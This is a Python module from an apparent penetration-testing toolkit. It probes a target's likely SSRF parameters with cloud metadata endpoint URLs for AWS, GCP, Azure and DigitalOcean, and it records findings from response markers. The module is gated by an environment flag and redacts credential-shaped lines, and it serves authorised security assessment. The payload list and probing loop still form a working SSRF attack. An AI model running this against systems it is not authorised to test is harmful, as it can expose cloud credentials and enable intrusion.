"""omega/offensive/offense/metassrf — cloud metadata SSRF specialist.

When an SSRF-capable parameter is known (from earlier findings or
operator-supplied), point it at cloud metadata endpoints and detect
IMDSv1 / GCP / Azure responses. CONFIRMATION is by response-body
differential only — the metadata markers are unambiguous — so hits
may be verification=confirmed with the raw evidence attached.
Never exfiltrates credentials: the probe only matches known
structural markers (e.g. 'ami-id', 'computeMetadata'), it does not
record the token/secret values themselves. OFFENSE-GATED
(PTK_OFFENSE).
"""
import os

__all__ = ["run_metassrf"]

TARGETS = [
    ("aws-imdsv1", "http://169.254.169.254/latest/meta-data/ami-id",
     "CWE-918", ["ami-id", "ami-launch-index"], "AWS IMDSv1 reachable"),
    ("aws-imdsv2-forced", "http://169.254.169.254/latest/api/token",
     "CWE-918", ["PUT"], "IMDSv2 token endpoint (PUT-only = v2 enforced)"),
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/"
            "project/project-id",
     "CWE-918", ["computeMetadata"], "GCP metadata reachable"),
    ("azure", "http://169.254.169.254/metadata/instance?api-version="
              "2021-02-01",
     "CWE-918", ["compute"], "Azure IMDS reachable"),
    ("digitalocean", "http://169.254.169.254/metadata/v1/hostname",
     "CWE-918", [], "DO metadata reachable"),
]

MARK_KEYS = ("access_token", "secret", "token", "password")


def _redact(body):
    """Keep structural markers, drop credential-shaped values."""
    lines = []
    for ln in str(body).splitlines():
        low = ln.lower()
        hit_key = next((k for k in MARK_KEYS if k in low), None)
        if hit_key:
            lines.append(f"[REDACTED LINE ({hit_key}) — SHAPE ONLY]")
        else:
            lines.append(ln)
    return "\n".join(lines)[:400]


def run_metassrf(target, ssrf_params=None, fetch=None, log=None,
                 gate_open_fn=None):
    """Probe metadata endpoints through candidate SSRF parameters.

    ssrf_params: param names believed SSRF-capable (from findings or
    operator). fetch: adapter called as fetch(url, method=...).
    """
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    fetch = fetch or (lambda *a, **k: None)
    ssrf_params = ssrf_params or ["url", "uri", "path", "dest", "redirect",
                                  "next", "src", "return", "returnTo"]
    findings = []
    probes = 0
    for pname in ssrf_params:
        for name, meta_url, cwe, markers, desc in TARGETS:
            sep = "&" if "?" in str(target) else "?"
            probe_url = str(target) + sep + pname + "=" + meta_url
            try:
                resp = fetch(probe_url, method="GET")
                probes += 1
            except Exception:
                continue
            if resp is None:
                continue
            body = getattr(resp, "text", "") or ""
            status = getattr(resp, "status", 0)
            if status == 405 and name == "aws-imdsv2-forced":
                findings.append({
                    "title": "IMDSv2 enforced (405 on token GET) — "
                             "info only",
                    "severity": "INFO",
                    "source": "metassrf/imdsv2-ok",
                    "evidence": "PUT-only token endpoint",
                    "location": str(target),
                    "verification": "confirmed",
                    "manual_check": "none needed (positive control)",
                    "cwe": cwe,
                })
                continue
            hit = [m for m in markers
                   if m != "PUT" and m.lower() in body.lower()]
            if hit:
                findings.append({
                    "title": f"cloud metadata reachable via SSRF "
                             f"({name}, param {pname})",
                    "severity": "CRITICAL" if name == "aws-imdsv1"
                                else "HIGH",
                    "source": "metassrf/metadata-marker",
                    "evidence": f"marker {hit[0]!r} in response; "
                                f"redacted body: {_redact(body)}",
                    "location": str(target),
                    "verification": "confirmed",
                    "manual_check": "marker provenance = the metadata "
                                    "service itself; do NOT store "
                                    "token/secret values — shape only",
                    "cwe": cwe,
                })
                return {"findings": findings, "probes": probes}
    if log:
        log(f"metassrf: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
